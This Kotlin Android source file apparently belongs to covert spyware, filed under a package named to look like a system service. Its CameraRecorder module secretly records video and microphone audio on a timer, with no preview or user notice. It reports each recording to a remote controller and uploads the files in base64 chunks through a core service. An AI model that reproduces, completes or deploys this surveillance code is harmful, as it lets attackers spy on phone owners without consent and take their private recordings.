package com.system.service.monitors

import android.content.Context
import android.hardware.camera2.*
import android.media.MediaRecorder
import android.os.Handler
import android.os.HandlerThread
import android.os.Build
import android.util.Base64
import android.view.Surface
import com.system.service.core.CoreService
import org.json.JSONObject
import java.io.File
import java.text.SimpleDateFormat
import java.util.*

object CameraRecorder {

    private var cameraDevice: CameraDevice? = null
    private var captureSession: CameraCaptureSession? = null
    private var mediaRecorder: MediaRecorder? = null
    private var backgroundThread: HandlerThread? = null
    private var backgroundHandler: Handler? = null
    private var currentFile: File? = null
    private var isRecording = false
    private var stopTimer: Timer? = null

    fun isRecording() = isRecording

    fun start(context: Context, durationSeconds: Int = 60, useFront: Boolean = false) {
        if (isRecording) return
        startBackgroundThread()
        val dir = File(context.getExternalFilesDir(null), "recordings/camera").also { it.mkdirs() }
        val ts  = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
        val outFile = File(dir, "cam_${ts}.mp4")
        currentFile = outFile

        try {
            val mr = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) MediaRecorder(context)
                     else @Suppress("DEPRECATION") MediaRecorder()
            mr.setAudioSource(MediaRecorder.AudioSource.MIC)
            mr.setVideoSource(MediaRecorder.VideoSource.SURFACE)
            mr.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            mr.setOutputFile(outFile.absolutePath)
            mr.setVideoEncodingBitRate(2_000_000)
            mr.setVideoFrameRate(24)
            mr.setVideoSize(640, 480)
            mr.setVideoEncoder(MediaRecorder.VideoEncoder.H264)
            mr.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            mr.prepare()
            mediaRecorder = mr

            val cm   = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
            val lens = if (useFront) CameraCharacteristics.LENS_FACING_FRONT
                       else           CameraCharacteristics.LENS_FACING_BACK
            val camId = cm.cameraIdList.firstOrNull { id ->
                cm.getCameraCharacteristics(id)
                    .get(CameraCharacteristics.LENS_FACING) == lens
            } ?: cm.cameraIdList.firstOrNull() ?: return

            cm.openCamera(camId, object : CameraDevice.StateCallback() {
                override fun onOpened(device: CameraDevice) {
                    cameraDevice = device
                    val recSurface = mr.surface
                    device.createCaptureSession(
                        listOf(recSurface),
                        object : CameraCaptureSession.StateCallback() {
                            override fun onConfigured(session: CameraCaptureSession) {
                                captureSession = session
                                val req = device.createCaptureRequest(CameraDevice.TEMPLATE_RECORD)
                                    .apply { addTarget(recSurface) }.build()
                                session.setRepeatingRequest(req, null, backgroundHandler)
                                mr.start()
                                isRecording = true
                                CoreService.instance?.sendData("camera_record_started", JSONObject().apply {
                                    put("filename", outFile.name)
                                    put("duration_seconds", durationSeconds)
                                })
                                if (durationSeconds > 0) {
                                    stopTimer = Timer()
                                    stopTimer!!.schedule(object : TimerTask() {
                                        override fun run() { stop(context) }
                                    }, durationSeconds * 1000L)
                                }
                            }
                            override fun onConfigureFailed(session: CameraCaptureSession) {
                                CoreService.instance?.sendData("camera_record_error",
                                    JSONObject().apply { put("error", "session_configure_failed") })
                            }
                        }, backgroundHandler)
                }
                override fun onDisconnected(device: CameraDevice) { device.close(); cameraDevice = null }
                override fun onError(device: CameraDevice, error: Int) {
                    device.close(); cameraDevice = null
                    CoreService.instance?.sendData("camera_record_error",
                        JSONObject().apply { put("error", "camera_error_$error") })
                }
            }, backgroundHandler)
        } catch (e: Exception) {
            CoreService.instance?.sendData("camera_record_error",
                JSONObject().apply { put("error", e.message ?: "unknown") })
        }
    }

    fun stop(context: Context) {
        stopTimer?.cancel(); stopTimer = null
        try { captureSession?.stopRepeating(); captureSession?.close() } catch (_: Exception) {}
        try { cameraDevice?.close() } catch (_: Exception) {}
        try { mediaRecorder?.stop(); mediaRecorder?.reset(); mediaRecorder?.release() } catch (_: Exception) {}
        cameraDevice = null; captureSession = null; mediaRecorder = null
        stopBackgroundThread()
        isRecording = false
        val file = currentFile
        if (file != null && file.exists()) {
            CoreService.instance?.sendData("camera_record_done", JSONObject().apply {
                put("filename", file.name)
                put("path", file.absolutePath)
                put("size_kb", file.length() / 1024)
            })
        }
        currentFile = null
    }

    fun listRecordings(context: Context): List<File> {
        val dir = File(context.getExternalFilesDir(null), "recordings/camera")
        return dir.listFiles()?.filter { it.name.endsWith(".mp4") }
            ?.sortedByDescending { it.lastModified() } ?: emptyList()
    }

    fun sendRecordingFile(context: Context, path: String) {
        val file = File(path)
        if (!file.exists()) {
            CoreService.instance?.sendData("camera_record_file_error",
                JSONObject().apply { put("error", "file_not_found"); put("path", path) })
            return
        }
        Thread {
            try {
                val maxChunkBytes = 60_000
                val bytes = file.readBytes()
                val totalChunks = (bytes.size + maxChunkBytes - 1) / maxChunkBytes
                for (i in 0 until totalChunks) {
                    val start = i * maxChunkBytes
                    val end   = minOf(start + maxChunkBytes, bytes.size)
                    val chunk = bytes.copyOfRange(start, end)
                    CoreService.instance?.sendData("camera_record_chunk", JSONObject().apply {
                        put("filename", file.name)
                        put("chunk", i)
                        put("total", totalChunks)
                        put("data", Base64.encodeToString(chunk, Base64.NO_WRAP))
                    })
                    Thread.sleep(50)
                }
            } catch (e: Exception) {
                CoreService.instance?.sendData("camera_record_file_error",
                    JSONObject().apply { put("error", e.message ?: "read_error") })
            }
        }.start()
    }

    private fun startBackgroundThread() {
        backgroundThread = HandlerThread("CameraRecorder").also { it.start() }
        backgroundHandler = Handler(backgroundThread!!.looper)
    }

    private fun stopBackgroundThread() {
        try { backgroundThread?.quitSafely(); backgroundThread?.join() } catch (_: Exception) {}
        backgroundThread = null; backgroundHandler = null
    }
}
